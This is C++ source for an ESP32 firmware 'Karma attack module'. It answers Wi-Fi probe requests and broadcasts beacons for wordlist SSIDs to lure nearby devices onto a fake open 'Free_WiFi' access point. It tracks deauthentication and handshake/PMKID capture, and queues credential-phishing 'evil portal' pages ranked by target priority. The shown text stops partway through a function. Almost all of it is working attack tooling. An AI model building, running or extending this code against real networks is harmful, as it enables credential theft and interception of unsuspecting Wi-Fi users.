/*
  Bruce Enhanced Karma attack module v2
  Author: Ninja-Jr. (@Ninja-jr)
  Version: 2.0
  Last updated: 25/08/2026
*/

#ifndef LITE_VERSION
#include "karma_attack.h"
#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/ringbuf.h"
#include "lwip/err.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/sniffer.h"
#include <Arduino.h>
#include <TimeLib.h>
#include <algorithm>
#include <globals.h>
#include <map>
#include <new>
#include <queue>
#include <set>
#include <string.h>
#include <vector>

// ──────────────────────────────────────────
// FALLBACK AP CONFIGURATION
// ──────────────────────────────────────────
#define KARMA_FALLBACK_SSID "Free_WiFi"
#define KARMA_FALLBACK_PASSWORD ""

// Forward declarations
void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type);
void saveHandshakeToFile(const HandshakeCapture &hs);
void forceFullRedraw();
void handleBroadcastResponse(const String &ssid, const String &mac);
void updateChannelActivity(uint8_t channel);
void updateSSIDFrequency(const String &ssid);

// Static forward declarations - MUST be before any usage
static bool ensureKarmaState();
static struct KarmaRuntimeState &state();
static void releaseKarmaState();
static std::vector<PendingPortal> &pendingPortalsRef();
static PortalTemplate &selectedTemplateRef();
static AttackConfig &attackConfigRef();
static bool templateSelectedRef();
static bool samePendingPortal(const PendingPortal &a, const PendingPortal &b);
static bool enqueuePendingPortal(const PendingPortal &portal, bool prioritize = false);
static void destroyActivePortal();
static size_t activePortalCount();
static bool isApModeActive();
static bool ensureKarmaApInterface(uint8_t channel);
static bool sendRawFrameOnAp(const void *buffer, int len, uint8_t channel);
static void copyStringToBuffer(char *dest, size_t destSize, const String &src);
static bool probeSSIDEquals(const ProbeRequest &probe, const char *value);
static bool probeSSIDEmpty(const ProbeRequest &probe);
static void freeProbeFrame(ProbeRequest &probe);
static void analyzeClientBehavior(const ProbeRequest &probe);
static uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe);
static AttackTier determineAttackTier(uint8_t priority);
static uint32_t getPortalDuration(AttackTier tier);
static int getWiFiBand(int channel);

// Global gKarmaState pointer
static KarmaRuntimeState *gKarmaState = nullptr;

// SyncState for multi-device sync
SyncState syncState;

// Constants
#define FILENAME "probe_capture_"
#define SAVE_INTERVAL 10
#define MAX_PROBE_BUFFER 200
#define MAC_CACHE_SIZE 100
#define MAX_CLIENT_TRACK 30
#define FAST_HOP_INTERVAL 500
#define DEFAULT_HOP_INTERVAL 2000
#define DEAUTH_INTERVAL 30000
#define VULNERABLE_THRESHOLD 3
#define AUTO_PORTAL_DELAY 2000
#define SSID_FREQUENCY_RESET 30000
#define RESPONSE_TIMEOUT_MS 5
#define BEACON_INTERVAL_MS 102400
#define MAX_CONCURRENT_SSIDS 4
#define MAC_ROTATION_INTERVAL 30000
#define MAX_PORTAL_TEMPLATES 10
#define MAX_PENDING_PORTALS 10
#define MAX_SSID_DB_SIZE 15000
#define MAX_POPULAR_SSIDS 20
#define MAX_NETWORK_HISTORY 30
#define ACTIVE_PORTAL_CHANNEL 0
#define MAX_DEAUTH_PER_SECOND 10
#define DEAUTH_BURST_WINDOW 1000
#define BEACON_BURST_SIZE 8
#define BEACON_BURST_INTERVAL 60
#define LISTEN_WINDOW 250
#define KARMA_QUEUE_DEPTH 48
#define PORTAL_HEARTBEAT_INTERVAL 500
#define PORTAL_MAX_IDLE 60000
#define RATE_LIMIT_WINDOW 60000
#define MAX_RETRIES_PER_SSID 5
#define PERMANENT_TARGET_THRESHOLD 10
#define SUCCESS_RATE_UPDATE_INTERVAL 30000
#define MAX_PROBE_FRAME_STORE 50
#define TEMPLATE_ROTATION_INTERVAL 300000
#define SYNC_INTERVAL 10000
#define MAX_BACKOFF_LEVEL 8

// Channel tables
const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
const uint8_t priorityChannels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
#define NUM_PRIORITY_CHANNELS 13

const uint8_t beacon_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
const uint8_t probe_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
const uint8_t ext_rates[] PROGMEM = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
const uint8_t rsn_wpa3[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
const uint8_t rsn_wpa2[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
const uint8_t rsn_transition[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F, 0xAC, 0x08};
const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
const uint8_t rotate_channels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
const uint8_t vendorOUIs[][3] PROGMEM = {
    {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
    {0x00, 0x0C, 0x29}, {0x00, 0x1D, 0x0F}, {0x00, 0x26, 0x5E}, {0x00, 0x19, 0xE3},
    {0x00, 0x21, 0x91}, {0x00, 0x1E, 0x8C}, {0x00, 0x12, 0x17}, {0x00, 0x18, 0xDE},
    {0x00, 0x1E, 0xE1}, {0x00, 0x13, 0x10}, {0x00, 0x1C, 0xDF}, {0x00, 0x0F, 0xEA},
    {0x00, 0x14, 0x6C}, {0x00, 0x25, 0x9C}, {0x00, 0x11, 0x22}, {0x00, 0x16, 0x6F}
};

// ============================================================
// getWiFiBand - Helper function for band detection
// ============================================================

static int getWiFiBand(int channel) {
    if (channel >= 1 && channel <= 14) return 0;      // 2.4GHz
    else if (channel >= 36 && channel <= 165) return 1; // 5GHz
    else if (channel >= 1 && channel <= 233) return 2;  // 6GHz
    return 0;  // Default to 2.4GHz
}

// ============================================================
// Karma Runtime State - MUST be defined before functions that use it
// ============================================================

struct KarmaRuntimeState {
    uint8_t activePortalChannel = 0;
    unsigned long deauthCount[14] = {0};
    unsigned long lastDeauthReset = 0;
    unsigned long lastBeaconBurst = 0;
    uint8_t beaconsInBurst = 0;
    QueueHandle_t karmaQueue = nullptr;
    TaskHandle_t karmaWriterHandle = nullptr;
    bool storageAvailable = true;
    KarmaMode karmaMode = MODE_PASSIVE;
    bool karmaPaused = false;
    BackgroundPortal *activePortal = nullptr;
    unsigned long lastPortalHeartbeat = 0;
    bool handshakeCaptureEnabled = false;
    std::vector<HandshakeCapture> handshakeBuffer;
    std::map<uint32_t, ClientBehavior> clientBehaviors;
    ActiveBroadcastAttack broadcastAttack;
    unsigned long last_time = 0;
    unsigned long last_ChannelChange = 0;
    unsigned long lastFrequencyReset = 0;
    unsigned long lastBeaconTime = 0;
    unsigned long lastMACRotation = 0;
    uint8_t channl = 0;
    bool flOpen = false;
    bool is_LittleFS = true;
    uint32_t pkt_counter = 0;
    bool auto_hopping = true;
    uint16_t hop_interval = DEFAULT_HOP_INTERVAL;
    File probe_file;
    RingbufHandle_t macRingBuffer = nullptr;
    String filen = "";
    std::vector<ProbeRequest> probeBuffer;
    uint16_t probeBufferIndex = 0;
    bool bufferWrapped = false;
    KarmaConfig karmaConfig = {};
    AttackConfig attackConfig = {};
    bool screenNeedsRedraw = false;
    uint32_t pmkidCaptured = 0;
    uint32_t assocBlocked = 0;
    uint8_t channelActivity[14] = {0};
    uint8_t currentPriorityChannel = 0;
    unsigned long lastDeauthTime = 0;
    unsigned long lastSaveTime = 0;
    uint32_t totalProbes = 0;
    uint32_t uniqueClients = 0;
    uint32_t karmaResponsesSent = 0;
    uint32_t deauthPacketsSent = 0;
    uint32_t autoPortalsLaunched = 0;
    uint32_t cloneAttacksLaunched = 0;
    uint32_t beaconsSent = 0;
    bool isPortalActive = false;
    bool restartKarmaAfterPortal = false;
    std::map<String, NetworkHistory> networkHistory;
    std::queue<ProbeResponseTask> responseQueue;
    std::vector<ActiveNetwork> activeNetworks;
    std::map<String, uint32_t> macBlacklist;
    uint8_t currentBSSID[6] = {0};
    std::vector<PortalTemplate> portalTemplates;
    PortalTemplate selectedTemplate;
    bool templateSelected = false;
    std::map<String, uint16_t> ssidFrequency;
    std::vector<std::pair<String, uint16_t>> popularSSIDs;
    std::vector<PendingPortal> pendingPortals;
    std::map<String, uint8_t> targetRateLimit;
    unsigned long lastRateLimitReset = 0;
    unsigned long lastTemplateRotation = 0;
    size_t templateRotationIndex = 0;
    bool isCoordinator = false;

    KarmaRuntimeState() {
        probeBuffer.resize(MAX_PROBE_BUFFER);
        handshakeBuffer.reserve(20);
        activeNetworks.reserve(MAX_CONCURRENT_SSIDS);
        portalTemplates.reserve(MAX_PORTAL_TEMPLATES);
        popularSSIDs.reserve(MAX_POPULAR_SSIDS);
        pendingPortals.reserve(MAX_PENDING_PORTALS);
    }

    ~KarmaRuntimeState() {
        for (auto &probe : probeBuffer) freeProbeFrame(probe);
        if (activePortal != nullptr) {
            delete activePortal->instance;
            delete activePortal;
            activePortal = nullptr;
        }
        if (macRingBuffer) {
            vRingbufferDelete(macRingBuffer);
            macRingBuffer = nullptr;
        }
        if (karmaQueue) {
            vQueueDelete(karmaQueue);
            karmaQueue = nullptr;
        }
        if (probe_file) probe_file.close();
    }
};

// ============================================================
// Static Function Implementations
// ============================================================

static bool ensureKarmaState() {
    if (gKarmaState != nullptr) return true;
    gKarmaState = new (std::nothrow) KarmaRuntimeState();
    return gKarmaState != nullptr;
}

static KarmaRuntimeState &state() {
    if (!ensureKarmaState()) {
        Serial.println("[KARMA] Failed to allocate runtime state");
        while (true) delay(1000);
    }
    return *gKarmaState;
}

static void releaseKarmaState() {
    delete gKarmaState;
    gKarmaState = nullptr;
}

static std::vector<PendingPortal> &pendingPortalsRef() { return state().pendingPortals; }
static PortalTemplate &selectedTemplateRef() { return state().selectedTemplate; }
static AttackConfig &attackConfigRef() { return state().attackConfig; }
static bool templateSelectedRef() { return state().templateSelected; }

static size_t activePortalCount() { return state().activePortal != nullptr ? 1U : 0U; }

static bool samePendingPortal(const PendingPortal &a, const PendingPortal &b) {
    return a.ssid == b.ssid && a.channel == b.channel && a.targetMAC == b.targetMAC &&
           a.templateFile == b.templateFile && a.isCloneAttack == b.isCloneAttack;
}

static bool enqueuePendingPortal(const PendingPortal &portal, bool prioritize) {
    auto &queue = pendingPortalsRef();

    for (auto &existing : queue) {
        if (!samePendingPortal(existing, portal)) continue;
        existing.timestamp = portal.timestamp;
        existing.priority = std::max(existing.priority, portal.priority);
        existing.probeCount = std::max(existing.probeCount, portal.probeCount);
        if (portal.tier > existing.tier) existing.tier = portal.tier;
        existing.duration = std::max(existing.duration, portal.duration);
        existing.verifyPassword = portal.verifyPassword;
        existing.isDefaultTemplate = portal.isDefaultTemplate;
        if (!portal.templateName.isEmpty()) existing.templateName = portal.templateName;
        if (!portal.templateFile.isEmpty()) existing.templateFile = portal.templateFile;
        if (portal.isHighValueTarget) existing.isHighValueTarget = true;
        return true;
    }

    if (queue.size() >= MAX_PENDING_PORTALS) {
        auto worstIt =
            std::min_element(queue.begin(), queue.end(), [](const PendingPortal &a, const PendingPortal &b) {
                if (a.priority != b.priority) return a.priority < b.priority;
                return a.timestamp < b.timestamp;
            });
        if (worstIt == queue.end()) return false;
        if (portal.priority < worstIt->priority) return false;
        if (portal.priority == worstIt->priority && portal.timestamp <= worstIt->timestamp) return false;
        queue.erase(worstIt);
    }

    if (prioritize) queue.insert(queue.begin(), portal);
    else queue.push_back(portal);
    return true;
}

static void destroyActivePortal() {
    if (state().activePortal == nullptr) return;
    if (state().activePortal->instance != nullptr) {
        delete state().activePortal->instance;
        state().activePortal->instance = nullptr;
    }
    delete state().activePortal;
    state().activePortal = nullptr;
    state().activePortalChannel = 0;
    state().isPortalActive = false;
    state().restartKarmaAfterPortal = true;
    state().auto_hopping = true;
}

// ============================================================
// State Management Functions
// ============================================================

static bool isApModeActive() {
    wifi_mode_t mode = WiFi.getMode();
    return mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA;
}

static bool ensureKarmaApInterface(uint8_t channel) {
    if (channel < 1 || channel > 14) channel = 1;

    if (!isApModeActive()) {
        if (!WiFi.mode(WIFI_MODE_AP)) {
            Serial.println("[KARMA] Failed to switch WiFi to AP mode");
            return false;
        }
        // Use fallback SSID instead of "BruceKarma"
        if (!WiFi.softAP(KARMA_FALLBACK_SSID, KARMA_FALLBACK_PASSWORD, channel, 0, 4, false)) {
            Serial.println("[KARMA] Failed to start AP interface");
            return false;
        }
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return true;
}

static bool sendRawFrameOnAp(const void *buffer, int len, uint8_t channel) {
    if (buffer == nullptr || len <= 0) return false;
    if (!ensureKarmaApInterface(channel)) return false;

    esp_err_t err = wifiRawTx(WIFI_IF_AP, buffer, len);
    if (err != ESP_OK) {
        Serial.printf("[KARMA] wifiRawTx failed: %s (%d)\n", esp_err_to_name(err), (int)err);
        return false;
    }

    return true;
}

static void copyStringToBuffer(char *dest, size_t destSize, const String &src) {
    if (destSize == 0) return;
    strncpy(dest, src.c_str(), destSize - 1);
    dest[destSize - 1] = '\0';
}

static bool probeSSIDEquals(const ProbeRequest &probe, const char *value) {
    return strcmp(probe.ssid, value) == 0;
}

static bool probeSSIDEmpty(const ProbeRequest &probe) { return probe.ssid[0] == '\0'; }

static void freeProbeFrame(ProbeRequest &probe) {
    if (probe.frame != nullptr) {
        free(probe.frame);
        probe.frame = nullptr;
    }
    probe.frame_len = 0;
}

// Macro definitions for state access
#define activePortalChannel (state().activePortalChannel)
#define deauthCount (state().deauthCount)
#define lastDeauthReset (state().lastDeauthReset)
#define lastBeaconBurst (state().lastBeaconBurst)
#define beaconsInBurst (state().beaconsInBurst)
#define karmaQueue (state().karmaQueue)
#define karmaWriterHandle (state().karmaWriterHandle)
#define storageAvailable (state().storageAvailable)
#define karmaMode (state().karmaMode)
#define karmaPaused (state().karmaPaused)
#define activePortal (state().activePortal)
#define lastPortalHeartbeat (state().lastPortalHeartbeat)
#define handshakeCaptureEnabled (state().handshakeCaptureEnabled)
#define handshakeBuffer (state().handshakeBuffer)
#define clientBehaviors (state().clientBehaviors)
#define broadcastAttack (state().broadcastAttack)
#define last_time (state().last_time)
#define last_ChannelChange (state().last_ChannelChange)
#define lastFrequencyReset (state().lastFrequencyReset)
#define lastBeaconTime (state().lastBeaconTime)
#define lastMACRotation (state().lastMACRotation)
#define channl (state().channl)
#define flOpen (state().flOpen)
#define is_LittleFS (state().is_LittleFS)
#define pkt_counter (state().pkt_counter)
#define auto_hopping (state().auto_hopping)
#define hop_interval (state().hop_interval)
#define _probe_file (state().probe_file)
#define macRingBuffer (state().macRingBuffer)
#define filen (state().filen)
#define probeBuffer (state().probeBuffer)
#define probeBufferIndex (state().probeBufferIndex)
#define bufferWrapped (state().bufferWrapped)
#define karmaConfig (state().karmaConfig)
#define attackConfig (state().attackConfig)
#define screenNeedsRedraw (state().screenNeedsRedraw)
#define pmkidCaptured (state().pmkidCaptured)
#define assocBlocked (state().assocBlocked)
#define channelActivity (state().channelActivity)
#define currentPriorityChannel (state().currentPriorityChannel)
#define lastDeauthTime (state().lastDeauthTime)
#define lastSaveTime (state().lastSaveTime)
#define totalProbes (state().totalProbes)
#define uniqueClients (state().uniqueClients)
#define karmaResponsesSent (state().karmaResponsesSent)
#define deauthPacketsSent (state().deauthPacketsSent)
#define autoPortalsLaunched (state().autoPortalsLaunched)
#define cloneAttacksLaunched (state().cloneAttacksLaunched)
#define beaconsSent (state().beaconsSent)
#define isPortalActive (state().isPortalActive)
#define restartKarmaAfterPortal (state().restartKarmaAfterPortal)
#define networkHistory (state().networkHistory)
#define responseQueue (state().responseQueue)
#define activeNetworks (state().activeNetworks)
#define macBlacklist (state().macBlacklist)
#define currentBSSID (state().currentBSSID)
#define portalTemplates (state().portalTemplates)
#define selectedTemplate (state().selectedTemplate)
#define templateSelected (state().templateSelected)
#define ssidFrequency (state().ssidFrequency)
#define popularSSIDs (state().popularSSIDs)
#define pendingPortals (state().pendingPortals)
#define targetRateLimit (state().targetRateLimit)
#define lastRateLimitReset (state().lastRateLimitReset)
#define lastTemplateRotation (state().lastTemplateRotation)
#define templateRotationIndex (state().templateRotationIndex)

// ============================================================
// SSIDDatabase Implementation
// ============================================================

String SSIDDatabase::currentFilename = "/ssid_list.txt";
bool SSIDDatabase::useLittleFS = false;
std::vector<String> SSIDDatabase::currentBatch;
size_t SSIDDatabase::currentBatchStart = 0;
std::map<String, size_t> SSIDDatabase::lruCache;
size_t SSIDDatabase::totalCount = 0;
bool SSIDDatabase::cacheInitialized = false;

FS *SSIDDatabase::openSourceFs() {
    FS *fs = nullptr;
    if (useLittleFS) return &LittleFS;
    if (!getFsStorage(fs)) return nullptr;
    return fs;
}

bool SSIDDatabase::readNextEntry(File &file, String &line) {
    while (file.available()) {
        line = file.readStringUntil('\n');
        line.trim();
        if (line.isEmpty()) continue;
        if (line.startsWith("#") || line.startsWith("//")) continue;
        if (line.length() > PROBE_SSID_MAX_LEN) continue;
        return true;
    }
    return false;
}

void SSIDDatabase::trimLRU() {
    while (lruCache.size() > MAX_CACHE_SIZE) {
        auto oldest = lruCache.begin();
        lruCache.erase(oldest);
    }
}

void SSIDDatabase::updateLRU(const String &ssid, size_t index) {
    auto it = lruCache.find(ssid);
    if (it != lruCache.end()) {
        lruCache.erase(it);
    }
    lruCache[ssid] = index;
    trimLRU();
}

size_t SSIDDatabase::getCount() {
    if (totalCount > 0) return totalCount;
    FS *fs = openSourceFs();
    if (fs == nullptr) return 0;
    File file = fs->open(currentFilename, FILE_READ);
    if (!file) return 0;
    size_t count = 0;
    String line;
    while (count < MAX_SSID_DB_SIZE && readNextEntry(file, line)) count++;
    file.close();
    totalCount = count;
    return count;
}

String SSIDDatabase::getSSID(size_t index) {
    if (index >= currentBatchStart && index < currentBatchStart + currentBatch.size()) {
        return currentBatch[index - currentBatchStart];
    }
    
    for (const auto &pair : lruCache) {
        if (pair.second == index) {
            String ssid = pair.first;
            lruCache.erase(pair.first);
            lruCache[ssid] = index;
            return ssid;
        }
    }
    
    getBatch(index, BATCH_SIZE, currentBatch);
    currentBatchStart = index;
    
    if (index < currentBatchStart + currentBatch.size()) {
        return currentBatch[index - currentBatchStart];
    }
    return "";
}

void SSIDDatabase::getBatch(size_t startIndex, size_t count, std::vector<String> &result) {
    result.clear();
    if (count == 0 || startIndex >= MAX_SSID_DB_SIZE) return;
    
    if (startIndex == currentBatchStart && !currentBatch.empty()) {
        size_t end = std::min(count, currentBatch.size());
        result.assign(currentBatch.begin(), currentBatch.begin() + end);
        return;
    }
    
    FS *fs = openSourceFs();
    if (fs == nullptr) return;
    File file = fs->open(currentFilename, FILE_READ);
    if (!file) return;
    
    result.reserve(count);
    String line;
    size_t index = 0;
    size_t targetEnd = startIndex + count;
    
    while (index < MAX_SSID_DB_SIZE && readNextEntry(file, line)) {
        if (index >= startIndex && index < targetEnd) {
            result.push_back(line);
            if (result.size() >= count) break;
        }
        index++;
    }
    file.close();
}

bool SSIDDatabase::contains(const String &ssid) {
    auto it = lruCache.find(ssid);
    if (it != lruCache.end()) {
        size_t index = it->second;
        lruCache.erase(it);
        lruCache[ssid] = index;
        return true;
    }
    
    for (const auto &entry : currentBatch) {
        if (entry == ssid) {
            updateLRU(ssid, 0);
            return true;
        }
    }
    
    FS *fs = openSourceFs();
    if (fs == nullptr) return false;
    File file = fs->open(currentFilename, FILE_READ);
    if (!file) return false;
    
    String line;
    size_t index = 0;
    bool found = false;
    while (index < MAX_SSID_DB_SIZE && readNextEntry(file, line)) {
        if (line == ssid) {
            found = true;
            updateLRU(ssid, index);
            break;
        }
        index++;
    }
    file.close();
    return found;
}

int SSIDDatabase::findSSID(const String &ssid) {
    auto it = lruCache.find(ssid);
    if (it != lruCache.end()) {
        size_t index = it->second;
        lruCache.erase(it);
        lruCache[ssid] = index;
        return index;
    }
    
    for (size_t i = 0; i < currentBatch.size(); i++) {
        if (currentBatch[i] == ssid) {
            size_t index = currentBatchStart + i;
            updateLRU(ssid, index);
            return index;
        }
    }
    
    FS *fs = openSourceFs();
    if (fs == nullptr) return -1;
    File file = fs->open(currentFilename, FILE_READ);
    if (!file) return -1;
    
    String line;
    int index = 0;
    while (index < MAX_SSID_DB_SIZE && readNextEntry(file, line)) {
        if (line == ssid) {
            file.close();
            updateLRU(ssid, index);
            return index;
        }
        index++;
    }
    file.close();
    return -1;
}

String SSIDDatabase::getRandomSSID() {
    size_t count = getCount();
    if (count == 0) return "";
    if (!lruCache.empty()) {
        int randomIndex = random(lruCache.size());
        auto it = lruCache.begin();
        std::advance(it, randomIndex);
        return it->first;
    }
    size_t targetIndex = random(count);
    return getSSID(targetIndex);
}

void SSIDDatabase::warmCache(const std::vector<String> &frequentSSIDs) {
    for (const auto &ssid : frequentSSIDs) {
        int index = findSSID(ssid);
        if (index >= 0) {
            updateLRU(ssid, index);
        }
    }
}

bool SSIDDatabase::setSourceFile(const String &filename, bool useLittleFSMode) {
    currentFilename = filename;
    useLittleFS = useLittleFSMode;
    clearCache();
    totalCount = 0;
    return true;
}

void SSIDDatabase::clearCache() {
    lruCache.clear();
    currentBatch.clear();
    currentBatchStart = 0;
    totalCount = 0;
}

bool SSIDDatabase::isLoaded() { return totalCount > 0 || !lruCache.empty(); }
String SSIDDatabase::getSourceFile() { return currentFilename; }
size_t SSIDDatabase::getCacheSize() { return lruCache.size(); }

// ============================================================
// ActiveBroadcastAttack Implementation
// ============================================================

ActiveBroadcastAttack::ActiveBroadcastAttack()
    : currentIndex(0), batchStart(0), lastBroadcastTime(0), lastChannelHopTime(0), _active(false),
      currentChannel(1), totalSSIDsInFile(0), ssidsProcessed(0), updateCounter(0),
      lastJitterTime(0), consecutiveFailures(0) {
    stats.startTime = millis();
}

String ActiveBroadcastAttack::getProgressString() const {
    return String(ssidsProcessed) + "/" + String(totalSSIDsInFile);
}

void ActiveBroadcastAttack::start() {
    size_t total = SSIDDatabase::getCount();
    if (total == 0) return;
    _active = true;
    currentIndex = 0;
    batchStart = 0;
    stats.startTime = millis();
    loadNextBatch();
    totalSSIDsInFile = SSIDDatabase::getCount();
    ssidsProcessed = 0;
    updateCounter = 0;
    consecutiveFailures = 0;
    backoffCounters.clear();
}

void ActiveBroadcastAttack::stop() { _active = false; }

void ActiveBroadcastAttack::restart() {
    stop();
    delay(100);
    start();
}

bool ActiveBroadcastAttack::isActive() const { return _active; }

void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) { config = newConfig; }

BroadcastConfig ActiveBroadcastAttack::getConfig() const { return config; }

void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) { 
    config.broadcastInterval = interval;
    config.minInterval = interval * 0.7;
    config.maxInterval = interval * 1.3;
}

void ActiveBroadcastAttack::setBatchSize(uint16_t size) {
    config.batchSize = size;
    loadNextBatch();
}

void ActiveBroadcastAttack::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) currentChannel = channel;
}

uint32_t ActiveBroadcastAttack::getJitteredInterval() const {
    if (!config.randomizeInterval) return config.broadcastInterval;
    uint32_t interval = config.broadcastInterval;
    int32_t jitter = (random(0, 200) - 100) * config.broadcastInterval / 1000;
    interval += jitter;
    if (interval < config.minInterval) interval = config.minInterval;
    if (interval > config.maxInterval) interval = config.maxInterval;
    return interval;
}

bool ActiveBroadcastAttack::shouldBackoff(const String &ssid) const {
    auto it = backoffCounters.find(ssid);
    if (it == backoffCounters.end()) return false;
    return it->second >= config.maxRetries;
}

void ActiveBroadcastAttack::updateBackoffCounter(const String &ssid, bool success) {
    if (success) {
        backoffCounters.erase(ssid);
        return;
    }
    if (config.useExponentialBackoff) {
        auto it = backoffCounters.find(ssid);
        if (it == backoffCounters.end()) {
            backoffCounters[ssid] = 1;
        } else {
            it->second = std::min((uint8_t)(it->second + 1), (uint8_t)MAX_BACKOFF_LEVEL);
        }
    }
}

void ActiveBroadcastAttack::recordFailedResponse(const String &ssid) {
    stats.failedResponses++;
    updateBackoffCounter(ssid, false);
}

void ActiveBroadcastAttack::update() {
    if (!_active) return;
    unsigned long now = millis();
    
    if (config.rotateChannels && (now - lastChannelHopTime > config.channelHopInterval)) {
        rotateChannel();
        lastChannelHopTime = now;
    }
    
    uint32_t interval = getJitteredInterval();
    if (now - lastBroadcastTime < interval) return;
    
    if (currentIndex >= currentBatch.size()) {
        batchStart += currentBatch.size();
        loadNextBatch();
        currentIndex = 0;
        if (currentBatch.empty()) {
            batchStart = 0;
            loadNextBatch();
        }
    }
    
    if (currentIndex < currentBatch.size()) {
        String ssid = currentBatch[currentIndex];
        
        if (!shouldBackoff(ssid)) {
            if (!highPrioritySSIDs.empty() && stats.totalBroadcasts % 10 == 0) {
                size_t hpIndex = stats.totalBroadcasts % highPrioritySSIDs.size();
                ssid = highPrioritySSIDs[hpIndex];
            }
            broadcastSSID(ssid);
            stats.totalBroadcasts++;
            ssidsProcessed++;
            updateCounter++;
            lastBroadcastTime = now;
            if (updateCounter >= 5) updateCounter = 0;
        }
        // ✅ FIX: Increment currentIndex after processing
        currentIndex++;
    }
}

void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const String &mac) {
    if (!config.respondToProbes) return;
    if (shouldBackoff(ssid)) {
        stats.rateLimitedCount++;
        return;
    }
    
    recordResponse(ssid);
    if (config.prioritizeResponses) {
        addHighPrioritySSID(ssid);
        auto it = backoffCounters.find(ssid);
        if (it != backoffCounters.end()) {
            backoffCounters.erase(it);
        }
    }
    if (stats.ssidResponseCount[ssid] >= 1) {
        launchAttackForResponse(ssid, mac);
        updateBackoffCounter(ssid, true);
    }
}

BroadcastStats ActiveBroadcastAttack::getStats() const { return stats; }

size_t ActiveBroadcastAttack::getTotalSSIDs() const { return totalSSIDsInFile; }

size_t ActiveBroadcastAttack::getCurrentPosition() const { return ssidsProcessed; }

float ActiveBroadcastAttack::getProgressPercent() const {
    if (totalSSIDsInFile == 0) return 0.0f;
    return (ssidsProcessed * 100.0f) / totalSSIDsInFile;
}

std::vector<std::pair<String, size_t>> ActiveBroadcastAttack::getTopResponses(size_t count) const {
    std::vector<std::pair<String, size_t>> sorted;
    size_t i = 0;
    for (const auto &pair : stats.ssidResponseCount) {
        if (i++ >= 20) break;
        sorted.push_back(pair);
    }
    std::sort(sorted.begin(), sorted.end(), [](const auto &a, const auto &b) { return a.second > b.second; });
    if (sorted.size() > count) sorted.resize(count);
    return sorted;
}

void ActiveBroadcastAttack::addHighPrioritySSID(const String &ssid) {
    for (const auto &hpSSID : highPrioritySSIDs)
        if (hpSSID == ssid) return;
    highPrioritySSIDs.push_back(ssid);
    if (highPrioritySSIDs.size() > 10) highPrioritySSIDs.erase(highPrioritySSIDs.begin());
}

void ActiveBroadcastAttack::clearHighPrioritySSIDs() { highPrioritySSIDs.clear(); }

void ActiveBroadcastAttack::loadNextBatch() {
    currentBatch.clear();
    SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
}

void ActiveBroadcastAttack::broadcastSSID(const String &ssid) { 
    sendBeaconFrameHelper(ssid, currentChannel);
}

void ActiveBroadcastAttack::rotateChannel() {
    // Use adaptive channel rotation based on supported bands
    std::vector<int> channelList = buildKarmaChannelList();
    static size_t channelIndex = 0;
    
    if (!channelList.empty()) {
        channelIndex = (channelIndex + 1) % channelList.size();
        currentChannel = channelList[channelIndex];
        setChannelWithSecond(currentChannel);
    } else {
        // Fallback to original rotation
        static size_t idx = 0;
        idx = (idx + 1) % (sizeof(rotate_channels) / sizeof(rotate_channels[0]));
        currentChannel = pgm_read_byte(&rotate_channels[idx]);
    }
}

void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel) {
    sendBeaconFrameHelper(ssid, channel);
}

void ActiveBroadcastAttack::recordResponse(const String &ssid) {
    stats.totalResponses++;
    if (stats.ssidResponseCount.size() < 30) { stats.ssidResponseCount[ssid]++; }
    stats.lastResponseTime = millis();
}

void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const String &mac) {
    if (!ensureKarmaState()) return;
    if (!templateSelectedRef()) return;
    if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
    
    auto &pendingList = pendingPortalsRef();
    auto &selectedTpl = selectedTemplateRef();
    auto &attackCfg = attackConfigRef();
    
    int queuedCount = 0;
    for (const auto &portal : pendingList)
        if (!portal.launched) queuedCount++;
    if (queuedCount >= config.maxActiveAttacks) return;
    if (pendingList.size() >= MAX_PENDING_PORTALS) return;
    
    PendingPortal portal;
